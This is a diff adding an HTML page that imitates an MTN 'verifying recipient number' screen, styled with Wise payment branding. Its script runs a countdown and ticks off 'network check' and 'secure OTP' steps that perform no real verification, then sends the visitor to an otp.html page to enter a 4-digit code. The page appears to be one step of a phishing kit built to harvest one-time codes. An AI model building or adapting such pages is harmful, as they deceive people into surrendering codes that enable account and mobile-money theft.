@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifying recipient · MTN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --wise-green: #9FE870;
+    --wise-forest: #0E1B0F;
+    --wise-grey: #6B7C6E;
+    --wise-border: #DDE5DF;
+    --wise-white: #FFFFFF;
+    --wise-error: #D14343;
+    --wise-success: #0E7C3A;
+    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
+    --mtn-yellow: #FFCC00;
+    --mtn-yellow-dark: #E6B800;
+    --mtn-black: #000000;
+    --mtn-border: #E4E4E4;
+    --mtn-text: #1A1A1A;
+    --mtn-text-light: #6B6B6B;
+    --mtn-text-muted: #9B9B9B;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .page-content {
+    max-width: 460px;
+    width: 100%;
+    text-align: center;
+    animation: contentPop 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
+  }
+  @keyframes contentPop {
+    from { opacity: 0; transform: translateY(14px) scale(0.97); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* Dual ring */
+  .verifying-ring {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 2rem;
+    position: relative;
+  }
+  .verifying-ring::before,
+  .verifying-ring::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 4px solid transparent;
+  }
+  .verifying-ring::before {
+    border-top-color: var(--mtn-yellow);
+    border-right-color: var(--mtn-yellow);
+    animation: spinRing 1.2s linear infinite;
+  }
+  .verifying-ring::after {
+    inset: 14px;
+    border-bottom-color: var(--wise-green);
+    border-left-color: var(--wise-green);
+    animation: spinRing 1.6s linear infinite reverse;
+  }
+  @keyframes spinRing { to { transform: rotate(360deg); } }
+
+  .verifying-center {
+    position: absolute;
+    inset: 34px;
+    background: var(--mtn-black);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1;
+  }
+  .verifying-center svg {
+    width: 22px; height: 22px;
+    stroke: var(--mtn-yellow);
+    fill: none; stroke-width: 2.2;
+    stroke-linecap: round; stroke-linejoin: round;
+    animation: iconPulse 1.6s ease-in-out infinite;
+  }
+  @keyframes iconPulse {
+    0%, 100% { opacity: 0.6; transform: scale(0.95); }
+    50% { opacity: 1; transform: scale(1); }
+  }
+
+  .verifying-title {
+    font-size: 1.5rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--mtn-text);
+    margin-bottom: 0.6rem;
+    line-height: 1.25;
+  }
+  .verifying-subtitle {
+    font-size: 0.92rem;
+    color: var(--mtn-text-light);
+    line-height: 1.55;
+    margin-bottom: 2rem;
+    font-weight: 400;
+    max-width: 360px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  /* Progress bar */
+  .verifying-progress-wrap {
+    max-width: 340px;
+    margin: 0 auto 1.25rem;
+  }
+  .verifying-progress-bar {
+    width: 100%;
+    height: 6px;
+    background: #EFEFEF;
+    border-radius: 3px;
+    overflow: hidden;
+    margin-bottom: 0.65rem;
+  }
+  .verifying-progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, var(--mtn-yellow) 0%, #FFB800 100%);
+    border-radius: 3px;
+    transition: width 1s linear;
+  }
+  .verifying-timer {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.4rem;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--mtn-text-light);
+    letter-spacing: 0.01em;
+    font-variant-numeric: tabular-nums;
+  }
+  .verifying-timer svg {
+    width: 15px; height: 15px;
+    stroke: var(--mtn-text-light);
+    fill: none; stroke-width: 2;
+    stroke-linecap: round; stroke-linejoin: round;
+  }
+  .verifying-timer .secs {
+    color: var(--mtn-text);
+    font-weight: 700;
+    font-size: 0.95rem;
+    min-width: 1ch;
+  }
+
+  /* Checklist card */
+  .verifying-checklist {
+    background: var(--wise-white);
+    border: 1px solid var(--mtn-border);
+    border-radius: 1rem;
+    padding: 1.25rem;
+    text-align: left;
+    margin-top: 1.75rem;
+    box-shadow: 0 8px 20px -8px rgba(0,0,0,0.08);
+  }
+
+  .check-item {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    padding: 0.7rem 0;
+    font-size: 0.86rem;
+    color: var(--mtn-text);
+    font-weight: 500;
+    border-bottom: 1px solid #F5F5F5;
+  }
+  .check-item:first-child { padding-top: 0; }
+  .check-item:last-child { border-bottom: none; padding-bottom: 0; }
+
+  .check-item .dot {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: var(--mtn-light-grey, #F7F7F7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: background 0.35s ease, transform 0.35s ease;
+  }
+  .check-item .dot svg {
+    width: 13px; height: 13px;
+    stroke: var(--mtn-text-muted);
+    fill: none; stroke-width: 3;
+    stroke-linecap: round; stroke-linejoin: round;
+    transition: stroke 0.35s ease;
+  }
+  .check-item.active .dot {
+    background: #FFF8D9;
+    animation: dotActive 1s ease-in-out infinite;
+  }
+  .check-item.active .dot svg {
+    stroke: var(--mtn-yellow-dark);
+    animation: spinRing 1s linear infinite;
+  }
+  @keyframes dotActive {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+  }
+
+  .check-item.done .dot {
+    background: #E8F5E9;
+    transform: scale(1.05);
+  }
+  .check-item.done .dot svg {
+    stroke: var(--wise-success);
+    animation: checkPop 0.35s ease;
+  }
+  @keyframes checkPop {
+    0% { transform: scale(0.6); }
+    60% { transform: scale(1.15); }
+    100% { transform: scale(1); }
+  }
+
+  .check-item .label {
+    color: var(--mtn-text-light);
+    transition: color 0.35s ease;
+  }
+  .check-item.active .label { color: var(--mtn-text); }
+  .check-item.done .label { color: var(--mtn-text); }
+
+  /* Footer note */
+  .verifying-note {
+    font-size: 0.78rem;
+    color: var(--mtn-text-muted);
+    line-height: 1.55;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+    text-align: left;
+    max-width: 360px;
+    margin: 1.5rem auto 0;
+  }
+  .verifying-note svg {
+    width: 15px; height: 15px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  @media (max-width: 480px) {
+    .verifying-title { font-size: 1.3rem; }
+    .verifying-checklist { padding: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="page-content">
+  <div class="verifying-ring">
+    <div class="verifying-center">
+      <svg viewBox="0 0 24 24">
+        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+      </svg>
+    </div>
+  </div>
+
+  <h1 class="verifying-title">Verifying recipient number</h1>
+  <p class="verifying-subtitle">
+    Confirming the MTN number with the network. This takes just a few seconds.
+  </p>
+
+  <div class="verifying-progress-wrap">
+    <div class="verifying-progress-bar">
+      <div class="verifying-progress-fill" id="verifyingProgress"></div>
+    </div>
+    <div class="verifying-timer">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      <span class="secs" id="verifyingSeconds">8</span> seconds remaining
+    </div>
+  </div>
+
+  <div class="verifying-checklist">
+    <div class="check-item active" id="check1">
+      <div class="dot">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="label">Number format validated</span>
+    </div>
+    <div class="check-item" id="check2">
+      <div class="dot">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="label">Network check in progress</span>
+    </div>
+    <div class="check-item" id="check3">
+      <div class="dot">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="label">Generating secure OTP</span>
+    </div>
+  </div>
+
+  <p class="verifying-note">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+    Do not close this page. Once verified, you'll be asked to enter a 4‑digit code.
+  </p>
+</div>
+
+<script>
+(function() {
+  const session = (function(){
+    try {
+      const raw = sessionStorage.getItem('wise_session');
+      return raw ? JSON.parse(raw) : {};
+    } catch(e) { return {}; }
+  })();
+
+  // ---- Guard: must have a session ----
+  if (!session.txnId) {
+    window.location.replace('mtn.html');
+    return;
+  }
+
+  const $ = id => document.getElementById(id);
+  const verifyingProgress = $('verifyingProgress');
+  const verifyingSeconds = $('verifyingSeconds');
+  const check1 = $('check1');
+  const check2 = $('check2');
+  const check3 = $('check3');
+
+  const VERIFY_SECONDS = 8;
+  const startedAt = Date.now();
+
+  // ---- Progress bar animation ----
+  // Use requestAnimationFrame for smoothness rather than CSS transitions
+  function animateProgress() {
+    const elapsed = (Date.now() - startedAt) / 1000;
+    const pct = Math.min(100, (elapsed / VERIFY_SECONDS) * 100);
+    verifyingProgress.style.width = pct + '%';
+    if (pct < 100) requestAnimationFrame(animateProgress);
+  }
+
+  // Delay start so the bar visibly grows from 0
+  setTimeout(() => { requestAnimationFrame(animateProgress); }, 60);
+
+  // ---- Seconds counter ----
+  let remaining = VERIFY_SECONDS;
+  verifyingSeconds.textContent = remaining;
+
+  const countdownInterval = setInterval(() => {
+    remaining -= 1;
+    if (remaining < 0) remaining = 0;
+    verifyingSeconds.textContent = remaining;
+    if (remaining <= 0) clearInterval(countdownInterval);
+  }, 1000);
+
+  // ---- Checklist progression ----
+  // Step 1 → done after 1.5s
+  setTimeout(() => {
+    check1.classList.remove('active');
+    check1.classList.add('done');
+    // Start step 2
+    check2.classList.add('active');
+  }, 1500);
+
+  // Step 2 → done after 4.5s
+  setTimeout(() => {
+    check2.classList.remove('active');
+    check2.classList.add('done');
+    // Start step 3
+    check3.classList.add('active');
+  }, 4500);
+
+  // Step 3 → done after 7s
+  setTimeout(() => {
+    check3.classList.remove('active');
+    check3.classList.add('done');
+  }, 7000);
+
+  // ---- After 8s, navigate to otp.html ----
+  setTimeout(() => {
+    // Save the verifying completion time
+    try {
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        ...session,
+        verifiedAt: Date.now()
+      }));
+    } catch(e) {}
+
+    window.location.href = 'otp.html';
+  }, VERIFY_SECONDS * 1000);
+})();
+</script>
+</body>
+</html>
